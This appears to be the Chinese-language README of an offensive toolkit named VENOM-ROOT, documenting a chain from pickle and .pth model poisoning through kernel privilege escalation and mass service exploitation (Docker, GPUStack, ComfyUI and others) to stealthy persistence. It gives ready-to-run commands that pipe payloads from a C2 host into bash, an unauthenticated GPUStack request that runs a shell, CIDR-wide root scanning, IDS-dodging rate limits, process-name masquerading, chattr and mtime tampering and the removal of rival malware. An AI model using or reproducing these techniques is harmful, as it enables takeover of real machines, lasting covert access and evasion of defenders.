# 毒牙 · VENOM-ROOT v2.6

**投毒夺 root 全链术**：投毒入口 → CVE 提权 → 免杀隐身 → 不死扎根 → 独占收编。
v2.6: 引号炸弹全面拆除（T3/T4/T6 base64 免疫）+ DL 竞态修复 + verify 顺序修复 + 三态下载通杀。

## 快速上手

### A线·投毒（有文件权限）
```bash
# 1. 模型投毒（ComfyUI/torch）—— 载荷 base64 内嵌，引号/管道全不破
python3 payloads/mk_pickle.py evil.ckpt 'curl -s http://C2/s|bash'
#    上传: POST /upload/image (subfolder=checkpoints, type=output, overwrite=true)

# 2. .pth 投毒（AI 机器最毒：py2/py3/conda 全环境，双文件保命）
bash payloads/pth_poison.sh 'curl -s http://C2/p|bash'

# 3. 依赖/镜像/配置钩子 投毒（见 SKILL.md 决策树）
```

### B线·CVE（无文件权限）
```bash
bash payloads/cve_scan.sh        # 判型：精确版本 map + 编译链 + 逃逸面
bash payloads/kernel_lpe.sh run  # 真弹药：下载→编译→memfd加载→验证→播钥
bash payloads/kernel_lpe.sh run /tmp/exp   # 自带 EXP
```

### C线·服务RCE（无权限起点 · 夺root主力）
```bash
# 秒杀器：批量扫 CIDR/资产 → 8 通道并发 → 命中即 root+毒牙一条龙
bash payloads/strike.sh 10.0.0.0/24                       # 批量
bash payloads/strike.sh -f targets.txt --deploy http://C2   # 命中布毒牙
bash payloads/strike.sh -f targets.txt --rate 10            # 每秒10目标限速(防IDS)
bash payloads/strike.sh -f targets.txt --resume --pool x    # 断点续扫(中断后重跑续)
python3 payloads/labpool.py                                # 本地靶池实战演练
bash payloads/strike.sh --pool lab -f /tmp/pool-targets.txt
bash payloads/strike.sh --local      # 本机容器面一键提权（docker/containerd/cgroup）
```
```bash
# 三线自动探测 + 一键打（Docker 2375 → GPUStack → ComfyUI，实战验证链）
bash payloads/svc_rce.sh <ip> <port> auto
# --deploy: root 后自动拉 C2/v21.sh 布毒牙（夺 + 扎根一条龙）
bash payloads/svc_rce.sh <ip> <port> auto --deploy http://C2
# 单线: docker | gpustack | comfy
# GPUStack 恶意模型（等价手搓）
curl -X POST http://T:30003/v2/models -d '{"name":"x","image":"python:3.11-slim","run_command":"bash -c \"curl -s http://C2/s|bash\""}'
```

### 落地持久化（root 后）
```bash
bash payloads/venom_deploy.sh                     # 随机 TAG（worker-b 样式）
bash payloads/venom_deploy.sh mytag http://YOUR_C2:PORT root@YOUR_PEER:22   # +互保
PURGE=1 bash payloads/venom_deploy.sh             # 严格独占清第三方

# 验证（读部署配置，自动）
bash payloads/verify_root.sh
```

## 目录
```
SKILL.md                 # 完整战术手册（v2）
payloads/
  mk_pickle.py           # pickle 投毒生成器（base64 载荷，实测通过）
  pth_poison.sh          # .pth 投毒（py2/py3/conda 通杀，双文件保命）
  cve_scan.sh            # CVE 判型矩阵 v2（精确版本 map）
  kernel_lpe.sh          # 内核提权真弹药（下载/编译/memfd/验证/播钥/update）
  strike.sh              # 【地图炮】秒杀器：8通道批量 root（docker/gpustack/containerd/redis/ray/k8s/ollama/comfy）
  svc_rce.sh             # 【主力】C线服务RCE 真载荷（Docker/GPUStack/ComfyUI 一键打）
  venom_deploy.sh        # 一体部署器 v2（随机名+8路触发+互保+HMAC+四层备份）
  verify_root.sh         # 参数化验证器（读 .cfg，PASS/FAIL）
```

## v2 关键修复（v1 的病）
| v1 病 | v2 药 |
|---|---|
| beacon pgrep 匹配不到→死循环多开 | PID 文件 + /proc cmdline 双校验（实测连跑5次=1进程） |
| kernel_lpe run 是死代码 | 真下载/编译/内存加载/验证/播钥 |
| verify 硬编码 .vx + 固定 C2 | 读部署 .cfg 参数化，--all 全机扫描 |
| cron 三连冗余 | 合并单条 + 8 路实体触发源 |
| pickle 局部函数→反序列化炸 | 模块级 os.system + base64（实测基础/复杂载荷双通过） |
| 文件名自带特征 | 随机自然名 TAG + mgr/sync/peer |
| C2 明文无验证 | HMAC sha256(TOK+TAG) 签名 + 指数退避 |

## 血训速查
1. pickle 投毒必须用**模块级可检索函数**（os.system），局部函数反序列化必炸
2. base64 是引号炸弹的解药：任何用户命令先进 b64 再进模板
3. beacon 保活别用 pgrep -f（cmdline 对不上就死循环）→ PID 文件 + /proc 扫描
4. verify 绝不改被验文件（只读 + 容差）
5. chattr 覆盖必败 → 先 -i 再写再 +i；mtime 文件+目录都要对齐
6. memfd 执行记得换 argv0（[kworker/u256:7]），进程名=第一道免杀
